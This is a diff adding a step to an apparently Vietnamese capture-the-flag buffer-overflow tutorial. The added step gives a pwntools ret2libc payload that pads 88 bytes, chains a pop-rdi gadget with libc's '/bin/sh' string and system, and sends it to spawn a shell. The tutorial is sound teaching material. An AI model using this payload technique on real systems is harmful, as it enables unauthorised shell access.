@@ -162,3 +162,11 @@ Truy cập web libc.rip rồi tìm đúng phiên bản libc vả tải về.
 Sau đó dùng công cụ pwninit để liên kết (patch) file binary với libc.
 
 ![Alt text](image/buffer-overflow28.png)
+
+Nãy ta đã dùng lệnh để chạy lại hàm main bây giờ chỉ cần ghi đè địa chỉ lệnh gọi system với argv đầu tiên là đường dẫn `/bin/sh`.
+
+    payload=b'A'*88
+    payload+=p64(pop_rdi)+p64(next(libc.search(b'/bin/sh')))
+    payload+=p64(libc.sym['system'])
+    p.sendafter(b'something: \n', payload)
+
